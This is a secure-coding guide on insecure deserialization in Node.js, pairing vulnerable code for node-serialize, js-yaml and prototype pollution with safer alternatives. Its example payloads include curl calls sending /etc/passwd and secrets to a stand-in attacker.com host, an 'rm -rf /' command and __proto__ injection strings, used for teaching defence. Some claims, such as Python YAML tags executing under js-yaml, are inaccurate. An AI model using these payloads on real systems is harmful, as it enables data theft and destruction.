# Insecure Deserialization

## Definition

**Insecure deserialization** is the unsafe conversion of untrusted data (bytes/strings) back into objects that can execute code. Deserialization vulnerabilities allow attackers to execute arbitrary code, escalate privileges, or compromise application state. The core issue is that some deserializers automatically instantiate objects or call methods during deserialization, providing "gadget chains" where existing classes can be chained together to achieve code execution.

## How Deserialization Vulnerabilities Work

### Object Instantiation During Deserialization

```javascript
// Normal deserialization (safe)
const userInput = '{"name": "John", "age": 30}';
const obj = JSON.parse(userInput);
// Result: Plain object with properties

// Dangerous deserialization (unsafe)
// If deserializer can instantiate classes:
class Database {
  constructor() {
    // Code runs during instantiation!
    console.log('Database connected');
  }
}

const input = '{"__type__": "Database"}';
const db = deserialize(input);  // Constructor called during deserialization!
```

### Gadget Chains

```
Gadget Chain: Series of classes that, when chained together, achieve code execution

Example chain (Java):
1. Attacker sends serialized InvokerTransformer object
2. During deserialization, ChainedTransformer instantiated
3. ChainedTransformer.transform() called (from Apache Commons)
4. Calls Runtime.getRuntime().exec(malicious command)
5. Arbitrary code execution

JavaScript/Node.js chains:
1. Attacker sends data targeting vulnerable library
2. During deserialization, objects instantiated
3. __proto__ or constructor properties polluted
4. Methods called with attacker-controlled arguments
5. Code execution through property injection
```

## Node.js: node-serialize Vulnerability

### Vulnerable: node-serialize Package

```javascript
// ❌ VULNERABLE: node-serialize
const serialize = require('node-serialize');

// Attacker-controlled data from network
const maliciousPayload = `_$$ND_FUNC$$_function(){ require('child_process').execSync('curl attacker.com/steal?data=' + require('fs').readFileSync('/etc/passwd')) }()`;

// Attempt to deserialize
const obj = serialize.unserialize(maliciousPayload);
// During unserialize(), the function is created and executed
// Attacker's code runs with application privileges

// Real attack
app.post('/api/config', (req, res) => {
  try {
    // ❌ Deserializing untrusted data
    const config = serialize.unserialize(req.body.data);

    // By this point, malicious code already executed
    res.json({ success: true });
  } catch (err) {
    res.status(400).json({ error: 'Invalid data' });
  }
});

// Exploit payload could:
// 1. Steal database credentials
// 2. Create backdoor user accounts
// 3. Modify application code
// 4. Exfiltrate sensitive data
// 5. Launch attacks on other systems
```

## YAML Deserialization Risks

### Unsafe YAML Load

```javascript
// ❌ VULNERABLE: yaml.load() (unsafe)
const yaml = require('js-yaml');

const userInput = `
  !!python/object/apply:os.system
  args: ['curl attacker.com/steal?data=' + SECRET]
`;

const data = yaml.load(userInput);  // Code executes during load!

// YAML can instantiate arbitrary objects:
const payload = `
  !!python/object/new:os.system
  [malicious command]
`;

// Or using Python 2 pickle syntax:
const rcePayload = `
  !!python/object/apply:subprocess.check_output
  args: ['curl http://attacker.com/exfiltrate']
`;
```

### Safe YAML Load

```javascript
// ✅ SECURE: yaml.safeLoad() (safe)
const yaml = require('js-yaml');

const data = yaml.safeLoad(userInput, {
  schema: yaml.SAFE_SCHEMA  // Only plain objects, arrays, strings
});

// Can only instantiate:
// - Plain objects {}
// - Arrays []
// - Strings, numbers, booleans
// - Dates (if enabled)
// - null, undefined

// Cannot instantiate:
// - Classes
// - Functions
// - Executable objects
```

## JSON Deserialization (Safer by Default)

### JSON.parse Safety

```javascript
// ✅ RELATIVELY SAFE: JSON.parse
const json = '{"name":"John","age":30}';
const obj = JSON.parse(json);

// JSON can only contain:
// - Objects {}
// - Arrays []
// - Strings
// - Numbers
// - Booleans
// - null

// Cannot contain:
// - Functions
// - Classes
// - Symbols
// - Executables

// However, JSON.parse can be exploited with reviver functions
```

### JSON.parse with Reviver Function (Dangerous)

```javascript
// ❌ VULNERABLE: Unsafe reviver function
const data = JSON.parse(userInput, (key, value) => {
  // Reviver functions execute during parsing!

  // ❌ If reviver instantiates classes
  if (value.__type__ === 'Function') {
    return new Function(value.code);  // Code execution!
  }

  // ❌ If reviver calls arbitrary functions
  if (value.__fn__) {
    return eval(value.__fn__);  // Code execution!
  }

  return value;
});
```

## Prototype Pollution via Deserialization

### Property Injection Attack

```javascript
// ❌ VULNERABLE: Merging untrusted data
app.post('/api/user', (req, res) => {
  const user = {};

  // ❌ Directly assigning user input
  Object.assign(user, req.body);

  // Attacker sends:
  // {"__proto__": {"isAdmin": true}}

  // Now: all objects inherit isAdmin = true
  // const newUser = {};
  // newUser.isAdmin → true (from prototype)

  // ❌ Attacker sends:
  // {"__proto__": {"constructor": {"prototype": {"isAdmin": true}}}}

  // ❌ Complex payload for property injection
  // {"__proto__": {"toString": "malicious function"}}

  res.json(user);
});

// Attack demonstration
const user1 = {};
const user2 = {};

Object.assign(user1, JSON.parse('{"__proto__": {"isAdmin": true}}'));

// Both users now have isAdmin = true (from modified prototype)
console.log(user1.isAdmin);  // true
console.log(user2.isAdmin);  // true (shouldn't be, but is!)
console.log({}.isAdmin);     // true (all objects affected!)
```

## Vulnerable Code Examples

### Node.js with node-serialize

```javascript
// ❌ VULNERABLE: Using node-serialize
const express = require('express');
const serialize = require('node-serialize');

const app = express();
app.use(express.text());  // Accept raw text

app.post('/api/config', (req, res) => {
  try {
    // ❌ Deserializing untrusted data
    const config = serialize.unserialize(req.body);

    // If attacker sends malicious payload:
    // _$$ND_FUNC$$_function() {
    //   require('child_process').execSync('rm -rf /')
    // }()

    // The function is created and executed during unserialize()
    // Application completely compromised

    res.json({ success: true, config });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.listen(3000);
```

### YAML Deserialization

```javascript
// ❌ VULNERABLE: Using yaml.load()
const express = require('express');
const yaml = require('js-yaml');

const app = express();

app.post('/api/deploy', (req, res) => {
  try {
    // ❌ Using unsafe yaml.load()
    const config = yaml.load(req.body.yamlConfig);

    // Attacker sends:
    // !!python/object/apply:os.system
    // args: ['curl attacker.com/steal']

    // Code executes during yaml.load()

    res.json({ success: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});
```

## Secure Code Examples

### Safe Deserialization

```javascript
// ✅ SECURE: Safe deserialization practices
const express = require('express');
const yaml = require('js-yaml');

const app = express();
app.use(express.json());

// ✅ SECURE: JSON deserialization (no unsafe reviver)
app.post('/api/user', (req, res) => {
  try {
    // ✅ JSON.parse is safe
    const userData = JSON.parse(req.body.data);

    // ✅ Validate structure before using
    if (typeof userData !== 'object' || Array.isArray(userData)) {
      return res.status(400).json({ error: 'Invalid format' });
    }

    // ✅ Use allowlist for properties
    const user = {
      name: userData.name || '',
      email: userData.email || '',
      age: userData.age || 0
    };

    // ✅ Properties come from trusted source now
    // ✅ No prototype pollution possible

    res.json({ success: true, user });
  } catch (err) {
    res.status(400).json({ error: 'Invalid JSON' });
  }
});

// ✅ SECURE: YAML with safeLoad
app.post('/api/deploy', (req, res) => {
  try {
    // ✅ Use safeLoad() with SAFE_SCHEMA
    const config = yaml.safeLoad(req.body.yamlConfig, {
      schema: yaml.SAFE_SCHEMA
    });

    // ✅ Can only create plain objects/arrays
    // ✅ No code execution possible

    res.json({ success: true, config });
  } catch (err) {
    console.error('YAML parse error:', err.message);
    res.status(400).json({ error: 'Invalid YAML format' });
  }
});

// ✅ SECURE: Safe object merging
app.post('/api/merge', (req, res) => {
  const defaults = {
    theme: 'light',
    language: 'en'
  };

  // ✅ Method 1: Allowlist properties
  const allowedKeys = ['theme', 'language'];
  const merged = { ...defaults };

  allowedKeys.forEach(key => {
    if (key in req.body) {
      merged[key] = req.body[key];
    }
  });

  // ✅ Method 2: Freeze prototype
  Object.freeze(Object.getPrototypeOf(merged));

  // ✅ Method 3: Use Object.create(null)
  const safeObj = Object.create(null);
  Object.assign(safeObj, merged);
  // safeObj has no prototype chain

  res.json({ success: true, merged });
});

// ✅ SECURE: Never deserialize untrusted bytecode
app.post('/api/validate-data', (req, res) => {
  // ❌ NEVER DO:
  // eval(req.body.code)
  // new Function(req.body.code)()
  // require('node-serialize').unserialize(req.body)

  // ✅ Only safe operations:
  // JSON.parse()
  // yaml.safeLoad()
  // schema validation

  res.json({ error: 'Use safe methods only' });
});
```

### Safe Schema Validation

```javascript
// ✅ SECURE: Validate data structure before using
const Joi = require('joi');
const Zod = require('zod');

// Using Joi
const schema = Joi.object({
  name: Joi.string().max(100).required(),
  email: Joi.string().email().required(),
  age: Joi.number().integer().min(0).max(150)
});

app.post('/api/user', (req, res) => {
  // ✅ Validate with schema
  const { error, value } = schema.validate(req.body);

  if (error) {
    return res.status(400).json({ error: error.details });
  }

  // ✅ Only trusted, validated data used
  createUser(value);

  res.json({ success: true });
});

// Using Zod
const UserSchema = Zod.object({
  name: Zod.string().max(100),
  email: Zod.string().email(),
  age: Zod.number().int().min(0).max(150).optional()
});

app.post('/api/user', (req, res) => {
  try {
    // ✅ Parse and validate
    const validatedUser = UserSchema.parse(req.body);

    createUser(validatedUser);

    res.json({ success: true });
  } catch (error) {
    if (error instanceof Zod.ZodError) {
      res.status(400).json({ error: error.errors });
    } else {
      res.status(500).json({ error: 'Internal error' });
    }
  }
});
```

## Mitigations and Best Practices

### 1. Avoid Deserializing Untrusted Data

```javascript
// ❌ AVOID:
serialize.unserialize(userInput)
eval(userInput)
new Function(userInput)
require(userInput)

// ✅ USE:
JSON.parse(userInput)
yaml.safeLoad(userInput)
```

### 2. Use JSON for Data Exchange

```javascript
// JSON is inherently safer than other serialization formats
// It cannot contain functions or classes
// Use JSON.parse without unsafe reviver functions

const obj = JSON.parse(untrustedData);  // Safe
```

### 3. Validate All Deserialized Data

```javascript
const schema = {
  name: { type: 'string', maxLength: 100 },
  email: { type: 'string', format: 'email' },
  age: { type: 'number', minimum: 0, maximum: 150 }
};

// Validate before using
const validated = validateAgainstSchema(data, schema);
```

### 4. Use Safe YAML Loading

```javascript
// Always use safeLoad
const data = yaml.safeLoad(input, {
  schema: yaml.SAFE_SCHEMA
});

// Never use load()
```

### 5. Protect Prototype Chain

```javascript
// Use Object.create(null) to avoid prototype pollution
const obj = Object.create(null);

// Or freeze prototype
Object.freeze(Object.getPrototypeOf(obj));

// Or use allowlist properties
const safe = {};
allowedKeys.forEach(key => {
  if (key in untrusted) {
    safe[key] = untrusted[key];
  }
});
```

### 6. Use TypeScript for Type Safety

```typescript
interface User {
  name: string;
  email: string;
  age?: number;
}

const parseUser = (data: unknown): User => {
  if (typeof data !== 'object' || data === null) {
    throw new Error('Invalid data');
  }

  const obj = data as Record<string, unknown>;

  return {
    name: String(obj.name || ''),
    email: String(obj.email || ''),
    age: typeof obj.age === 'number' ? obj.age : undefined
  };
};
```

### 7. Monitor and Log Deserialization

```javascript
// Log suspicious deserialization attempts
app.post('/api/data', (req, res) => {
  try {
    const data = JSON.parse(req.body.data);

    // ✅ Check for suspicious patterns
    const dataStr = JSON.stringify(req.body.data);

    if (dataStr.includes('__proto__') ||
        dataStr.includes('constructor') ||
        dataStr.includes('prototype')) {
      console.warn('Suspicious deserialization attempt:', {
        ip: req.ip,
        data: req.body.data
      });

      // Could block or alert
    }

    res.json({ success: true });
  } catch (err) {
    res.status(400).json({ error: 'Invalid data' });
  }
});
```

## Summary

Insecure deserialization is particularly dangerous in JavaScript and Node.js. Prevent vulnerabilities by: (1) using JSON.parse for data exchange instead of unsafe formats, (2) never using eval or Function() on untrusted input, (3) using yaml.safeLoad instead of yaml.load, (4) validating all deserialized data against a schema, (5) protecting the prototype chain from pollution, and (6) avoiding libraries known for deserialization vulnerabilities like node-serialize. Always treat deserialization as a security-critical operation and apply the principle of least trust to untrusted input.
